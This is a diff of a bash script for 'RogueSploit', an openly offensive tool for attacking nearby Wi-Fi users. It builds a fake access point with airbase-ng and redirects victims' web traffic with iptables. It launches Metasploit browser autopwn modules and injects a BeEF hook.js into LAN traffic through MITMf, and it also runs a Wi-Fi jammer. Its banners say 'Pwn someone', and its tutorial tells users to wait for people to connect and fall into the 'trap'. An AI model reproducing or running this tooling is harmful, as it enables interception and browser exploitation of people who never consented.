@@ -11,6 +11,10 @@
 # - Pwn someone                                                                                              #
 ##############################################################################################################
 
+
+rm $PWD/roguesploit.log
+DATE=$(date)
+echo $DATE
 #colors
 cyan='\e[0;36m'
 green='\e[0;34m'
@@ -20,6 +24,7 @@ white='\e[1;37m'
 red='\e[1;31m'
 yellow='\e[1;33m'
 blue='\e[1;34m'
+
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
@@ -40,8 +45,6 @@ sleep 3
 echo -ne $red"Press any key to continue... "
 read starting
 clear
-
-
 
 ###################################################
 # CTRL C
@@ -64,6 +67,10 @@ echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 exit
 }
 
+LOG_FILE=$PWD/roguesploit.log
+exec > >(tee -a ${LOG_FILE} )
+exec 2> >(tee -a ${LOG_FILE} >&2)
+echo $DATE > $PWD/roguesploit.log
 #WARNING !!!
 clear
 echo -e $red" Loading the world..."
@@ -103,17 +110,20 @@ relase_rules () {
 	iptables -t mangle -F
 	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
 	iptables -A FORWARD -i wlan1 -j ACCEPT
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf at0
 }
 #AutoPWN 1
 autopwning1 () {
+	relase_rules
 	rogueon
 	sleep 0.7
 	msfconsole -r $(pwd)/roguepwn1.rc
 }
 #AutoPWN 2
 autopwning2 () {
+	relase_rules
 	rogueon
 	sleep 0.7
 	msfconsole -r $(pwd)/roguepwn2.rc
@@ -121,7 +131,7 @@ autopwning2 () {
 
 #Correct Mitmf installation
 mitmf_install () {
-	echo -ne $blue"["$yellow"?"$blue"] "$yellow"Do you want to correctly install MITMF? (y/n)"$blue"["$yellow"*"$blue"]\n";
+	echo -ne $blue"["$yellow"?"$blue"] "$yellow"Do you want to correctly install MITMF? (y/n)"$blue"["$yellow"*"$blue"]\n\n";
 	echo -ne $yellow"mitmf"$white"@"$red"install"$white"# "; read mitans
 	if [ $mitans != 'n' ] && [ $mitans != 'N' ] && [ $mitans != 'No' ]
 		then
@@ -134,15 +144,16 @@ mitmf_install () {
 #!/bin/bash
 cd $HOME/MITMf/ && sudo python mitmf.py "$@"
 EOF
-		chmod 777 /bin/bash/mitmf
+		chmod 777 /usr/bin/mitmf
 		sudo pip uninstall Twisted
 		sudo pip install Twisted==15.5.0
 		sleep 2
-		echo -e $green"[*] DONE [*]"
+		echo -e $lightgreen"[*] DONE [*]"
 	fi
 }
 #BeEF w/ Mitmf's js url injection
 beefinject () {
+	relase_rules
 	echo -e $blue"["$yellow"*"$blue"]"$yellow" Starting BeEF Locally! "$blue"["$yellow"*"$blue"]"
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing configuration of BeEF! "$blue"["$yellow"*"$blue"]"
@@ -354,7 +365,7 @@ beef:
             ssl_verify: true
             callback_host: "10.0.0.1"
             autopwn_url: "autopwn"
-            auto_msfrpcd: true
+            auto_msfrpcd: false
             auto_msfrpcd_timeout: 120
             msf_path: [ 
               {os: 'osx', path: '/opt/local/msf/'},
@@ -911,7 +922,8 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 30 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+#mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js
 	menu
 }
 #Welcome Screen
@@ -946,7 +958,7 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo xterm -title "FAKE AP" -bg "#000000" -fg "#ff0000" -geometry 100x25+1-1 -e airbase-ng -e "$nameap" -v wlan1 & relase_rules && rogueon 
+	rogueon && airbase-ng -e "$nameap" -v wlan1 
 	menu
 elif test $answer1 == '2'
 	then
@@ -954,7 +966,7 @@ elif test $answer1 == '2'
 	echo -e $green"Which services do you want to start $myname? "
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
-	echo -e $white"3. BeEF + MITMF full lan infection"
+	echo -e $white" 3. BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read choice
 	if test $choice == '1'
@@ -1125,15 +1137,15 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo airbase-ng -e "$nameap" -v wlan1 &&
+	rogueon && airbase-ng -e "$nameap" -v wlan1
 	menu
 elif test $answer1 == '2'
 	then
 	clear
 	echo -e $green"Which services do you want to start $myname? "
-	echo -e $yellow" 1) Browser Autopwn 1 "
-	echo -e $blue" 2) Browser Autopwn 2 "
-	echo -e $white" 3) BeEF + MITMF full lan infection"
+	echo -e $yellow" 1. Browser Autopwn 1 "
+	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -e $white" 3. BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read choice
 	if test $choice == '1'
@@ -1154,7 +1166,7 @@ elif test $answer1 == '2'
 		beefinject
 		clear
 		menu
-	else
+	else 
 		echo -e $red"[!]  Incorrect Number  [!]"
 		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
 		read back
@@ -1178,12 +1190,14 @@ elif test $answer1 == '2'
 	fi
 elif test $answer1 == '3'
 	then
+	clear
 	echo -e $cyan"Starting massive jamming as you ordered!"
 	python wifijammer.py
 	menu	
 elif test $answer1 == '4'
 	then
-	echo -e "Made by _B4ckP0r7 with love, Italian Engeering"
+	clear
+	echo -e "Made by B4ckP0r7 with love, Italian Engeering" | lolcat
 	echo -e $blue"   Big thanks to:"
 	echo -e $lightgreen"--<[ $myname, a fantastic user! ]>--"
 	echo -e $red"--<[ My friends ]>--"
@@ -1200,17 +1214,19 @@ elif test $answer1 == '5'
 	pkill dhcpd
 	pkill airmon-ng
 	pkill airbase-ng
+	ifconfig at0 down
 	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
 	exit
 elif test $answer1 == '6'
 	then
+	clear
 	echo -e $white" TUTORIAL FOR ROGUESPLOIT"
 	echo -e $yellow" 1) OPEN 2 DIFFERENT TERMINALS;"
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
 	echo -e $yellow" 3) IN THE SECOND TERMINAL SELECT PWNING SERVICES (Option 2)"
-	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL BROWSER_AUTOWPN SERVER!"
+	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL TRAP!"
 	echo -e $yellow" 5) Did you understand $myname ?If any problems, or strange things appens, just go here --> https://github.com/B4ckP0r7/RogueSploit/issues and open a new issue!"
 	echo -ne $yellow"Press any key to continue..."
 	read continuos
@@ -1232,20 +1248,21 @@ elif test $answer1 == '7'
 		cp roguepwn1.rc $HOME/RogueBackup/roguepwn1.rc.backup
 		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn1.rc" -s -o $PWD/roguepwn1.rc
 		sleep 0.4
-		cp roguepwn1.rc $HOME/RogueBackup/roguepwn2.rc.backup
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
 		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
+		cp roguepwn2.rc $HOME/RogueBackup/roguepwn2.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
 		chmod +x * -R
-		echo -e ""$green"Updated successfully! Restarting the script to apply the changes ..."
+		echo -e $green" Updated successfully! Restarting the script to apply the changes ..."
 		sleep 3
 		exec $0
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
-		echo -e $red"[!!] Update aborted! Returning main menu in 5 secs [!!]"
-		sleep 5
+		echo -e $red"[!!] Update aborted! Returning main menu in 3 secs [!!]"
+		sleep 3
 		menu
 	fi
 else
@@ -1258,7 +1275,6 @@ else
 		pkill dhcpd
 		pkill airmon-ng
 		pkill airbase-ng
-		ifconfig at0 down
 		sleep 1
 		echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
 		echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
@@ -1270,6 +1286,5 @@ else
 		menu
 	fi
 fi
-
 
 
